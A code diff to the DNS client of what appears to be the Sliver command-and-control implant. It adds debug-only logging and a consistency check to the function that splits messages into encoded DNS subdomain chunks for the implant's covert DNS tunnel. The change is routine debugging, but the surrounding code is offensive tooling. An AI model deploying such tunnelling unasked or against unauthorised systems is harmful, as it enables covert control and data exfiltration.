@@ -626,6 +626,9 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 	stop := start
 	lastLen := 0
 	var encoded string
+	// {{if .Config.Debug}}
+	encodedSubdata := []string{}
+	// {{end}}
 	for index := 0; stop < len(data); index++ {
 		if len(data) < index {
 			panic("boundary miscalculation") // We should always be able to encode more than one byte
@@ -655,6 +658,9 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 			// {{end}}
 		}
 		lastLen = len(msg.Data) // Save the amount of data that fit for the next loop
+		// {{if .Config.Debug}}
+		encodedSubdata = append(encodedSubdata, encoded)
+		// {{end}}
 		domain, err := s.joinSubdataToParent(encoded)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -665,6 +671,24 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		subdata = append(subdata, domain)
 		start = stop
 	}
+
+	// {{if .Config.Debug}}
+	total := 0
+	for index, domain := range encodedSubdata {
+		dnsMsg := &dnspb.DNSMessage{}
+		rawData, _ := encoder.Decode([]byte(domain))
+		proto.Unmarshal(rawData, dnsMsg)
+		total += len(dnsMsg.Data)
+		log.Printf("[dns] subdata %d (%d->%d): %d bytes",
+			index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
+	}
+	log.Printf("[dns] original data: %d bytes", len(data))
+	log.Printf("[dns] total subdata: %d bytes", total)
+	if total != len(data) {
+		panic("failed to properly encode subdata")
+	}
+	// {{end}}
+
 	return subdata, nil
 }
 
